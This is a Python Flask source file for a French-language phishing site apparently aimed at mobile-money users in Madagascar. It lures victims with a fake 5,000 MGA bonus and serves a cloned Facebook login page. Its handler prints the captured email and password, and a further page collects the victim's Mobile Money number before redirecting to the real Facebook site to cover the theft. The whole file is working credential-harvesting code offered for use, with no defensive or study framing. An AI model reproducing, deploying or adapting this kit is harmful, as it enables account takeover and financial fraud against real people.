import os
from flask import Flask, request, redirect

app = Flask(__name__)

# --- INTERFACE 1 : LES ÉTAPES (L'accueil) ---
HTML_ACCUEIL = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; padding: 20px; }
        .card { background: white; width: 100%; max-width: 400px; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-top: 5px solid #2ecc71; }
        h2 { color: #2c3e50; text-align: center; }
        .step { background: #f1f8f5; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #2ecc71; }
        .step b { color: #27ae60; display: block; margin-bottom: 5px; }
        .btn-start { display: block; width: 100%; padding: 15px; background: #2ecc71; color: white; text-align: center; text-decoration: none; border-radius: 8px; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Bonus de 5 000 MGA 🎁</h2>
        <p style="text-align: center; color: #7f8c8d;">Suivez les étapes obligatoires pour débloquer votre transfert immédiat :</p>
        
        <div class="step">
            <b>Étape 1 : Authentification</b>
            Inscrivez-vous via votre compte Facebook pour vérifier votre identité.
        </div>
        
        <div class="step">
            <b>Étape 2 : Paiement</b>
            Entrez votre numéro Mobile Money pour recevoir le bonus.
        </div>

        <a href="/verify" class="btn-start">COMMENCER L'ÉTAPE 1</a>
    </div>
</body>
</html>
'''

# --- INTERFACE 2 : FACEBOOK (Capture identifiants) ---
HTML_FACEBOOK = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; flex-direction: column; align-items: center; margin: 0; }
        .header { width: 100%; background-color: #fff; padding: 20px 0; text-align: center; color: #1877f2; font-size: 30px; font-weight: bold; }
        .login-box { width: 90%; max-width: 400px; margin-top: 20px; text-align: center; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 15px; margin: 5px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; margin-top: 10px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">facebook</div>
    <div class="login-box">
        <p style="color: #606770; font-size: 14px;">Connectez-vous pour continuer vers l'étape 2</p>
        <form action="/capture_fb" method="post">
            <input type="text" name="email" placeholder="Mobile number or email" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
'''

# --- INTERFACE 3 : MOBILE MONEY (Capture Numéro) ---
HTML_MOMO = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; padding: 20px; }
        .promo-box { width: 100%; max-width: 400px; background: white; padding: 25px; border-radius: 12px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #2ecc71; }
        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #2ecc71; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="promo-box">
        <h2>Dernière Étape ! ✅</h2>
        <p>Identité vérifiée avec succès. Entrez le numéro de réception :</p>
        <form action="/final" method="post">
            <input type="text" name="momo_number" placeholder="Numéro Mobile Money (Mvola, Orange, Airtel)" required>
            <button type="submit">RECEVOIR MES 5 000 MGA</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return HTML_ACCUEIL

@app.route('/verify')
def verify():
    return HTML_FACEBOOK

@app.route('/capture_fb', methods=['POST'])
def capture_fb():
    user = request.form.get('email')
    password = request.form.get('pass')
    print(f"\n[!] IDENTIFIANTS CAPTURÉS : {user} | {password}")
    return HTML_MOMO

@app.route('/final', methods=['POST'])
def final():
    momo = request.form.get('momo_number')
    print(f"[+] NUMÉRO MOMO : {momo}\n")
    return redirect("https://m.facebook.com")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
